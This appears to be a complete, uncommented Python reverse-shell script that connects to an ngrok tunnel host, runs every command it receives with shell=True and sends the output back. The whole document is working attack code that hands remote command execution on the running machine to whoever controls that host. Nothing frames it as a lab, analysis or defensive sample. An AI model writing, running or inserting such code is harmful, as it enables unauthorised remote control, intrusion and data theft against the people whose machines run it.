import socket, subprocess

HOST = "6.tcp.eu.ngrok.io"
PORT = 12652

s = socket.socket()
s.connect((HOST, PORT))

while True:
    try:
        cmd = s.recv(4096).decode().strip()
        if not cmd:
            continue
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "(no output)\n"
        s.send(output.encode())
    except Exception as e:
        s.send(f"ERROR: {e}\n".encode())
